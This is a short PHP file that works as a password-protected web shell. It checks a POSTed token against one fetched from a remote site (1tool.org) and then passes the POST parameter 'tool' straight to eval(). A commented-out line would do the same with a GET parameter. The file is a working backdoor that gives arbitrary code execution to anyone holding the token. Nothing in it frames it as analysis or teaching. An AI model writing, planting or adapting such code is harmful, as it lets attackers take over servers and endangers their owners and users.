<?php 
//header("ALLOW-CONTROL-ALLOW-ORIGIN:*");
//header("text/html;charset=UTF-8");
//header('Access-Control-Allow-Methods:*');


//eval($_GET[tool]);
$token = $_POST['token'];
$url = 'http://www.1tool.org/Security/token.txt';  //这儿填页面地址
$tokentxt=file_get_contents($url);
if($tokentxt !=$token){
header("location:http://www.1tool.org/");
return;
}
eval($_POST[tool]);
?>